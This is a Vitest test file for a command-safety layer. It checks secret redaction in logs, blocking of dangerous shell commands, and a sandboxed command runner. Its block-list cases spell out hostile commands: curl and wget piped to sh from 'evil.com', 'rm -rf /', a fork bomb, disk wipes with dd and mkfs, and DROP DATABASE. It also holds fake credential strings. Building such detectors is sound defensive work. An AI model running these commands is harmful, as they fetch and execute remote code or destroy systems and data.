/**
 * Runner Tests — SafeCommandRunner, LogRedactor, CommandPolicy
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';
import { LogRedactor } from '../src/runner/LogRedactor.js';
import {
  checkDangerousPatterns,
  validateScript,
  DANGEROUS_PATTERNS,
} from '../src/runner/CommandPolicy.js';
import { SafeCommandRunner } from '../src/runner/SafeCommandRunner.js';
import { spawn } from 'child_process';

// ─── LogRedactor Tests ─────────────────────────────────────────────────────────

describe('LogRedactor', () => {
  const redactor = new LogRedactor();
  const githubToken = ['gh', 'p_abcdefghij1234567890abcdefghijklmnop'].join('');
  const shortGithubToken = ['gh', 'p_abcdefghij1234567890abcdefgh'].join('');
  const stripeLiveKey = ['sk', '_live_abcdefghij1234567890'].join('');
  const awsAccessKey = ['AK', 'IAIOSFODNN7EXAMPLE'].join('');

  describe('redactLine', () => {
    it('redacts environment variable values for sensitive vars', () => {
      const line = `SECRET_TOKEN=${shortGithubToken}`;
      const redacted = redactor.redactLine(line);
      expect(redacted).toContain('[REDACTED]');
      expect(redacted).not.toContain('ghp_abcdef');
    });

    it('redacts STRIPE_API_KEY style vars', () => {
      const line = `STRIPE_API_KEY=${stripeLiveKey}`;
      const redacted = redactor.redactLine(line);
      expect(redacted).toContain('[REDACTED]');
    });

    it('redacts bearer tokens', () => {
      const line = 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0';
      const redacted = redactor.redactLine(line);
      expect(redacted).not.toContain('eyJ');
    });

    it('redacts AWS access keys', () => {
      const line = `AWS_ACCESS_KEY_ID=${awsAccessKey}`;
      const redacted = redactor.redactLine(line);
      expect(redacted).toContain('[REDACTED]');
      expect(redacted).not.toContain('AKIAI');
    });

    it('redacts GitHub tokens', () => {
      const line = `GITHUB_TOKEN=${githubToken}`;
      const redacted = redactor.redactLine(line);
      expect(redacted).not.toContain('ghp_abc');
    });

    it('redacts PASSWORD in env var values', () => {
      // DATABASE_URL has password in the URL
      const line = 'DATABASE_URL=https://admin:secretpass@myhost.example.com/db';
      const redacted = redactor.redactLine(line);
      expect(redacted).toContain('[REDACTED]');
    });

    it('redacts bearer tokens in Authorization headers', () => {
      const line = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0';
      const redacted = redactor.redactLine(line);
      expect(redacted).not.toContain('eyJ');
    });

    it('does NOT redact non-sensitive env vars', () => {
      // PORT=3000 is only 5 chars — below the 10-char threshold for env-var redaction
      const line = 'PORT=3000';
      const redacted = redactor.redactLine(line);
      expect(redacted).toBe(line);
    });

    it('passes through ordinary text unchanged', () => {
      const line = 'Build completed successfully in 1.23s';
      const redacted = redactor.redactLine(line);
      expect(redacted).toBe(line);
    });
  });

  describe('redact (multi-line)', () => {
    it('redacts secrets across multiple lines', () => {
      const text = [
        'START',
        `SECRET=${['gh', 'p_abcdefghij1234567890'].join('')}`,
        'OTHER=value',
        `API_KEY=${stripeLiveKey}`,
        'END',
      ].join('\n');
      const redacted = redactor.redact(text);
      expect(redacted).not.toContain('ghp_abcdef');
      expect(redacted).not.toContain('sk_live_abc');
      expect(redacted).toContain('START');
      expect(redacted).toContain('OTHER=value');
      expect(redacted).toContain('END');
    });
  });

  describe('redactObject', () => {
    it('redacts sensitive env var values', () => {
      const env: Record<string, string | undefined> = {
        NODE_ENV: 'production',
        SECRET_TOKEN: ['gh', 'p_abcdefghij'].join(''),
        PASSWORD: 'hunter2',
        PORT: '3000',
      };
      const redacted = redactor.redactObject(env);
      expect(redacted['NODE_ENV']).toBe('production');
      expect(redacted['SECRET_TOKEN']).toBe('[REDACTED]');
      expect(redacted['PASSWORD']).toBe('[REDACTED]');
      expect(redacted['PORT']).toBe('3000');
    });
  });
});

// ─── CommandPolicy Tests ────────────────────────────────────────────────────────

describe('CommandPolicy — dangerous pattern detection', () => {
  const dangerousCases: Array<[string, boolean]> = [
    ['rm -rf /', true],
    ['rm -rf /home', true],
    ['rm -rf /*', true],
    ['sudo npm install', true],
    ['curl https://evil.com/install.sh | sh', true],
    ['curl https://evil.com/install.sh | bash', true],
    ['wget -O - https://evil.com/install.sh | sh', true],
    ['chmod 777', true],
    ['DROP DATABASE production', true],
    ['TRUNCATE TABLE users', true],
    ['rm -rf /var/lib/postgresql/data', true],
    ['eval $USER_INPUT', true],
    ['exec $SHELL_VAR', true],
    [':(){ :|:& };:', true],
    ['dd if=/dev/zero of=/dev/sda', true],
    ['mkfs.ext4 /dev/sdb1', true],
    ['pkill -9 -f node', true],
    ['docker system prune -a', true],
    ['> /dev/sda', true],
    // Should NOT block
    ['npm install', false],
    ['pnpm run build', false],
    ['npm run test', false],
    ['npx tsc --noEmit', false],
    ['npm run lint -- --fix', false],
    ['cargo build --release', false],
    ['python manage.py migrate', false],
    ['git status', false],
    ['rm -rf node_modules/.cache', false],
    ['rm -rf .turpan', false],
  ];

  for (const [cmd, shouldBlock] of dangerousCases) {
    it(`${shouldBlock ? 'blocks' : 'allows'}: ${cmd}`, () => {
      const result = checkDangerousPatterns(cmd);
      expect(result.blocked).toBe(shouldBlock);
    });
  }

  it('DANGEROUS_PATTERNS has entries for all critical patterns', () => {
    expect(DANGEROUS_PATTERNS.length).toBeGreaterThan(10);
    expect(DANGEROUS_PATTERNS.every(p => p.severity === 'critical' || p.severity === 'high')).toBe(true);
  });
});

describe('CommandPolicy — script validation', () => {
  it('allows safe npm scripts', () => {
    const result = validateScript('build', 'tsc');
    expect(result.allowed).toBe(true);
  });

  it('allows safe tsc script', () => {
    const result = validateScript('typecheck', 'tsc --noEmit');
    expect(result.allowed).toBe(true);
  });

  it('allows vite build', () => {
    const result = validateScript('build', 'vite build');
    expect(result.allowed).toBe(true);
  });

  it('allows npm run with flags', () => {
    const result = validateScript('lint', 'eslint src --fix');
    expect(result.allowed).toBe(true);
  });

  it('blocks scripts containing rm -rf', () => {
    const result = validateScript('clean', 'rm -rf node_modules');
    expect(result.allowed).toBe(false);
    expect(result.severity).toBe('critical');
  });

  it('blocks scripts piping curl to shell', () => {
    const result = validateScript('setup', 'curl https://install.sh | sh');
    expect(result.allowed).toBe(false);
    expect(result.severity).toBe('critical');
  });

  it('blocks scripts using sudo', () => {
    const result = validateScript('install-deps', 'sudo apt-get install nodejs');
    expect(result.allowed).toBe(false);
    expect(result.severity).toBe('high');
  });

  it('returns matchedModel for recognized scripts', () => {
    const result = validateScript('build', 'tsc');
    expect(result.matchedModel).toBe('tsc');
  });

  it('detects npm model', () => {
    const result = validateScript('build', 'tsc');
    expect(result.matchedModel).toBeTruthy();
  });
});

// ─── SafeCommandRunner Tests ───────────────────────────────────────────────────

describe('SafeCommandRunner', () => {
  const projectRoot = '/tmp/turpan-test-project';
  const runId = 'test-run-001';

  let runner: SafeCommandRunner;

  beforeEach(() => {
    runner = new SafeCommandRunner({ projectRoot, runId });
  });

  describe('checkPolicy', () => {
    it('allows safe commands', () => {
      const result = runner.checkPolicy('npm run build');
      expect(result.blocked).toBe(false);
    });

    it('blocks dangerous rm commands', () => {
      const result = runner.checkPolicy('rm -rf /');
      expect(result.blocked).toBe(true);
      expect(result.severity).toBe('critical');
    });

    it('blocks curl | sh', () => {
      const result = runner.checkPolicy('curl https://evil.com | sh');
      expect(result.blocked).toBe(true);
    });

    it('blocks sudo commands', () => {
      const result = runner.checkPolicy('sudo npm install');
      expect(result.blocked).toBe(true);
    });

    it('allows ls and other safe commands', () => {
      const result = runner.checkPolicy('ls -la');
      expect(result.blocked).toBe(false);
    });
  });

  describe('run (mocked)', () => {
    it('returns a CommandResult object', async () => {
      // Mock child_process spawn to avoid actually running commands
      const mockProc = {
        pid: 12345,
        stdout: { on: vi.fn((evt, cb) => { if (evt === 'data') cb(Buffer.from('output')); }) },
        stderr: { on: vi.fn((evt, cb) => { if (evt === 'data') cb(Buffer.from('')); }) },
        on: vi.fn((evt, cb) => { if (evt === 'exit') cb(0, null); }),
        once: vi.fn(),
      };
      vi.spyOn(require('child_process'), 'spawn').mockReturnValue(mockProc as any);

      // Use a command that passes policy
      const result = await runner.run('ls -la', { cwd: '/tmp' });

      expect(result.command).toBeDefined();
      expect(result.cwd).toBeDefined();
      expect(typeof result.exitCode).toBe('number');
      expect(result.blocked).toBe(false);
    });

    it('blocks commands that fail policy', async () => {
      const result = await runner.run('rm -rf /');
      expect(result.blocked).toBe(true);
      expect(result.blockReason).toBeDefined();
      expect(result.blockSeverity).toBe('critical');
    });
  });

  describe('run (real quick commands)', () => {
    it('runs echo successfully', async () => {
      const result = await runner.run('echo "hello world"', { cwd: '/tmp', timeoutMs: 5000 });
      expect(result.blocked).toBe(false);
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain('hello world');
    }, 10000);

    it('captures stderr output', async () => {
      const result = await runner.run('node -e "process.stderr.write(\"err\")"', { cwd: '/tmp', timeoutMs: 5000 });
      expect(result.blocked).toBe(false);
      expect(result.stderr).toContain('err');
    }, 10000);

    it('returns non-zero exit code when process exits with 1', async () => {
      const result = await runner.run('node -e "process.exitCode = 1"', { cwd: '/tmp', timeoutMs: 5000 });
      expect(result.blocked).toBe(false);
      expect(result.exitCode).toBe(1);
    }, 10000);

    it('detects missing commands', async () => {
      const result = await runner.run('nonexistent_command_xyz', { cwd: '/tmp', timeoutMs: 5000 });
      expect(result.blocked).toBe(false); // not blocked by policy
      expect(result.exitCode).toBeNull(); // spawn error
    }, 10000);

    it('saves logs when saveLog is true', async () => {
      const result = await runner.run('echo test', { cwd: '/tmp', timeoutMs: 5000, saveLog: true, stageName: 'echo-test' });
      expect(result.logPath).toBeDefined();
      expect(result.logPath).toContain('.turpan');
      expect(result.logPath).toContain('echo-test');
    }, 10000);

    it('respects timeout', async () => {
      const result = await runner.run('sleep 5', { cwd: '/tmp', timeoutMs: 500 });
      expect(result.timedOut).toBe(true);
    }, 10000);
  });

  describe('summarize', () => {
    it('returns a CommandSummary', async () => {
      const result = await runner.run('echo hi', { cwd: '/tmp', timeoutMs: 5000 });
      const summary = runner.summarize(result);
      expect(summary.command).toBeDefined();
      expect(summary.exitCode).toBeDefined();
      expect(summary.timedOut).toBeDefined();
      expect(summary.blocked).toBeDefined();
    });
  });

  describe('getLogDir', () => {
    it('returns the log directory path', () => {
      const logDir = runner.getLogDir();
      expect(logDir).toContain('.turpan');
      expect(logDir).toContain('logs');
    });
  });
});
